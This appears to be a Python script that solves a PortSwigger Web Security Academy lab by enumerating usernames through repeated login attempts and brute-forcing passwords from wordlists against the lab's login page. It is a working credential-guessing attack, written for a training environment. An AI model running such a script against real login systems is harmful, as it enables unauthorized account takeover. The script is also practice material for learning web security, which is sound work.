import requests
from bs4 import BeautifulSoup

# Get new lab url from https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
url = 'https://UPDATEME.web-security-academy.net/login'

# Save usernames to file from https://portswigger.net/web-security/authentication/auth-lab-usernames
auth_lab_usernames = 'auth-lab-usernames.txt'
# Saved passwords to file from https://portswigger.net/web-security/authentication/auth-lab-passwords
auth_lab_passwords = 'auth-lab-passwords.txt'

def checkUrlStatus():
    response = requests.get(url)
    if response.status_code != 200:
        print("Update Acccess Lab URL before running script.")
        quit()
    else:
        print("Lab URL is OK.")

def login(username, password):
    payload = {'username': username.rstrip(),'password': password.rstrip()}
    response = requests.post(url, data=payload, allow_redirects=False) 
    return response

def get_warning_text(soup, cssclass):
    warning = soup.select_one(cssclass)
    if warning is not None:
        return warning.get_text()
    else:
        return "No warning detected, valid credential found?"

def load_usernames():
    with open(auth_lab_usernames, 'r') as f:
        usernames = f.readlines()
    return usernames

def load_passwords():
    with open(auth_lab_passwords, 'r') as f:
        passwords = f.readlines()
    return passwords


def enumerate_username():
    for username in load_usernames():
        u, p = username, "password"
        for n in range(5):
            response = login(u, p)
            soup = BeautifulSoup(response.content, 'html.parser')
            warning = get_warning_text(soup, '.is-warning')
            print(f'Request {n} using {u.rstrip()}:{p.rstrip()} caused the following response: {warning}')


def brute_force_user_account(username):
    for p in load_passwords():
        response = login(username, p)
        soup = BeautifulSoup(response.content, 'html.parser')
        warning = get_warning_text(soup, '.is-warning')
        print(f'Request using {username}:{p.rstrip()} caused the following response: {warning}')


# Sanity check that URL is live
checkUrlStatus()
enumerate_username()
# brute_force_user_account("username")
